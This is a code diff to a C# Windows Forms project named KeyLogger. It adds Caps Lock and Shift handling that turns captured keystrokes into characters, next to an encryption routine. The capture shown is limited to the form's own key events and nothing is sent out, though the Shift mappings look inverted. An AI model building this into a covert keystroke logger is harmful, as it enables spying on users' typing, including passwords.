@@ -27,7 +27,7 @@ namespace KeyLogger
         string k = "";
         byte[] key = new byte[16];
         byte[] iv = new byte[16];
-
+        bool CaplockIsTrue = false;
         //Encrypt
         static byte[] Encrypt(string simpletext, byte[] key, byte[] iv)
         {
@@ -186,15 +186,31 @@ namespace KeyLogger
             timer1.Interval = 1000;
             timer1.Start();
         }
+        private void Form1_KeyUp(object sender, KeyEventArgs e)
+        {
+            string wrote = "";
+            if (e.KeyCode == Keys.ShiftKey)
+                wrote = "ShiftKeyUp";
+            if (wrote != "")
+            {
+                k = k + wrote + " ";
+            }
+            label4.Text = k;
+
+            label6.Text = e.KeyCode.ToString();
+            label7.Text = e.KeyValue.ToString();
+            label8.Text = e.KeyData.ToString();
+        }
 
         private void Form1_KeyDown(object sender, KeyEventArgs e)
         {
             //
             string wrote = "";
-
+            CaplockIsTrue = Control.IsKeyLocked(Keys.CapsLock);
             if (e.KeyCode == Keys.Space)
                 wrote = " ";
             // nhap so
+
             else if (char.IsDigit((char)e.KeyCode) && e.Modifiers != Keys.Shift)
             {
                 wrote = ((char)e.KeyCode).ToString();
@@ -233,22 +249,52 @@ namespace KeyLogger
                     case Keys.Oemcomma: wrote = ","; break;
                 }
             }
+            //Nhap chu in hoa qua Capslock
+            else if (CaplockIsTrue && char.IsLetter((char)e.KeyCode))
+            {
+                if (e.Modifiers != Keys.Shift)
+                {
+                    switch (e.KeyCode)
+                    {
+                        case Keys.Oem1: wrote = ":"; break;
+                        case Keys.Oem7: wrote = "\""; break;
+                        case Keys.OemOpenBrackets: wrote = "{"; break;
+                        case Keys.Oem6: wrote = "}"; break;
+                        case Keys.Oem5: wrote = "|"; break;
+                        case Keys.Oemtilde: wrote = "~"; break;
+                        default: wrote = e.KeyCode.ToString(); break;
+                    }
+                }
+                else
+                {
+                    switch (e.KeyCode)
+                    {
+                        case Keys.Oem1: wrote = ";"; break;
+                        case Keys.Oem7: wrote = "'"; break;
+                        case Keys.OemOpenBrackets: wrote = "["; break;
+                        case Keys.Oem6: wrote = "]"; break;
+                        case Keys.Oem5: wrote = @"\"; break;
+                        case Keys.Oemtilde: wrote = "`"; break;
+                        default: wrote = e.KeyCode.ToString().ToLower(); break;
+                    }
+                }
+            }
             // Nhap chu in hoa + cac Oem dang ki tu
             else if (char.IsLetter((char)e.KeyCode) && e.Modifiers == Keys.Shift)
             {
                 switch (e.KeyCode)
                 {
-                    case Keys.Oem1: wrote = ":"; break;
-                    case Keys.Oem7: wrote = "\""; break;
-                    case Keys.OemOpenBrackets: wrote = "{"; break;
-                    case Keys.Oem6: wrote = "}"; break;
-                    case Keys.Oem5: wrote = "|"; break;
-                    case Keys.Oemtilde: wrote = "~"; break;
+                    case Keys.Oem1: wrote = ";"; break;
+                    case Keys.Oem7: wrote = "'"; break;
+                    case Keys.OemOpenBrackets: wrote = "["; break;
+                    case Keys.Oem6: wrote = "]"; break;
+                    case Keys.Oem5: wrote = @"\"; break;
+                    case Keys.Oemtilde: wrote = "`"; break;
                     default: wrote = e.KeyCode.ToString(); break;
                 }
             }
             // nhap chu thuong
-            else if ((char.IsLetter((char)e.KeyCode) && e.Modifiers != Keys.Shift))
+            else if ((char.IsLetter((char)e.KeyCode) && e.Modifiers != Keys.Shift && !CaplockIsTrue))
             {
                 switch (e.KeyCode)
                 {
@@ -315,5 +361,7 @@ namespace KeyLogger
                 }
             }*/
         }
+
+        
     }
 }
